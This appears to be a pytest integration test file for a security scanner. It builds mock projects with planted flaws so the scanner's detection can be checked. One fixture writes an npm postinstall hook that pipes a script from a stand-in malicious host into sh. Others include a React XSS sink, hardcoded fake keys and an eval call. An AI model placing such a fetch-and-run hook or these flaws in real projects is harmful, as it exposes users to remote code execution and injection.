"""Integration tests for the unified scanner."""

import json
from pathlib import Path

import pytest

from src.unified_scanner import UnifiedScanner


class TestIntegration:
    """Integration tests for end-to-end functionality."""

    def test_react_project_scan(self, tmp_path):
        """Test scanning a React project."""
        # Create a mock React project
        self._create_react_project(tmp_path)

        scanner = UnifiedScanner()
        result = scanner.scan(tmp_path)

        # Should detect React-specific issues
        categories = {f.category for f in result.findings}
        assert "react_xss" in categories or "hardcoded_api_key" in categories

        # Should have valid summary
        assert result.summary.files_scanned > 0
        assert result.summary.scan_time > 0
        assert isinstance(result.summary.asr_score, float)

    def test_npm_project_scan(self, tmp_path):
        """Test scanning an npm project."""
        # Create package.json with vulnerabilities
        package_json = tmp_path / "package.json"
        package_json.write_text(
            json.dumps(
                {
                    "name": "test-project",
                    "dependencies": {"@internal/secret-package": "1.0.0"},
                    "scripts": {"postinstall": "curl http://malicious.com/script.sh | sh"},
                }
            )
        )

        scanner = UnifiedScanner()
        result = scanner.scan(tmp_path)

        # Should detect npm-specific issues
        categories = {f.category for f in result.findings}
        assert "dependency_confusion" in categories or "suspicious_script" in categories

    def test_false_positive_filtering(self, tmp_path):
        """Test false positive filtering in real scenario."""
        # Create test files with mock data
        test_file = tmp_path / "auth.test.js"
        test_file.write_text(
            """
describe('Auth service', () => {
    const MOCK_API_KEY = 'sk-test-1234567890abcdef';
    
    it('should authenticate', () => {
        expect(auth.login(MOCK_API_KEY)).toBe(true);
    });
});
"""
        )

        # Create production file with real issue
        prod_file = tmp_path / "config.js"
        prod_file.write_text(
            """
const config = {
    apiKey: 'sk-prod-abcdef1234567890'
};
"""
        )

        scanner = UnifiedScanner()
        result = scanner.scan(tmp_path)

        # Should filter out test file findings
        test_findings = [f for f in result.findings if "test.js" in f.file_path]
        prod_findings = [f for f in result.findings if "config.js" in f.file_path]

        # Test findings should be filtered out or reduced
        assert len(test_findings) <= len(prod_findings)

    def test_output_formats(self, tmp_path):
        """Test all output formats work."""
        # Create simple test file
        test_file = tmp_path / "test.py"
        test_file.write_text("eval('malicious code')")  # nosec - test code

        scanner = UnifiedScanner()
        result = scanner.scan(tmp_path)

        # Test JSON output
        json_output = scanner.to_json(result)
        data = json.loads(json_output)
        assert "scan_summary" in data
        assert "findings" in data

        # Test Markdown output
        md_output = scanner.to_markdown(result)
        assert "# MCP Sentinel Scanner Report" in md_output
        assert "## Summary" in md_output

        # Test HTML output (basic check)
        html_output = scanner.to_html(result)
        assert "<html" in html_output
        assert "Security Report" in html_output

        # Test SARIF output
        sarif_output = scanner.to_sarif(result)
        sarif_data = json.loads(sarif_output)
        assert sarif_data["version"] == "2.1.0"
        assert "runs" in sarif_data

    def test_cli_integration(self, tmp_path):
        """Test CLI integration with unified scanner."""
        # Create test file
        test_file = tmp_path / "vulnerable.py"
        test_file.write_text("password = 'hardcoded-secret-123456'")

        # Test would require subprocess call to CLI
        # This is a placeholder for CLI integration test
        assert test_file.exists()

    def test_performance_requirements(self, tmp_path):
        """Test performance meets requirements."""
        # Create multiple files to test performance
        for i in range(50):
            test_file = tmp_path / f"file_{i}.py"
            test_file.write_text(f"# File {i}\nprint('hello world')")

        scanner = UnifiedScanner()
        result = scanner.scan(tmp_path)

        # Should complete in reasonable time
        assert result.summary.scan_time < 30  # 30 seconds for 50 files
        assert result.summary.files_scanned >= 50

    def test_error_resilience(self, tmp_path):
        """Test scanner handles errors gracefully."""
        # Create file with permission issues
        restricted_file = tmp_path / "restricted.py"
        restricted_file.write_text("secret = 'test'")
        restricted_file.chmod(0o000)  # No permissions

        scanner = UnifiedScanner()

        try:
            result = scanner.scan(tmp_path)
            # Should not crash
            assert isinstance(result.summary.scan_time, float)
        finally:
            # Restore permissions for cleanup
            restricted_file.chmod(0o644)

    def _create_react_project(self, project_dir: Path):
        """Create a mock React project structure."""
        # Create package.json
        package_json = project_dir / "package.json"
        package_json.write_text(
            json.dumps({"name": "react-app", "dependencies": {"react": "^18.0.0"}})
        )

        # Create React component with vulnerability
        src_dir = project_dir / "src"
        src_dir.mkdir()

        component = src_dir / "Component.jsx"
        component.write_text(
            """
import React from 'react';

function UserProfile({ userBio }) {
    return (
        <div dangerouslySetInnerHTML={{__html: userBio}} />
    );
}

export default UserProfile;
"""
        )

        # Create .env file with hardcoded key
        env_file = project_dir / ".env"
        env_file.write_text("REACT_APP_API_KEY=sk-1234567890abcdef")

        # Create auth utility with localStorage
        auth_file = src_dir / "auth.js"
        auth_file.write_text(
            """
export function saveToken(token) {
    localStorage.setItem('jwt', token);
}
"""
        )

        return project_dir
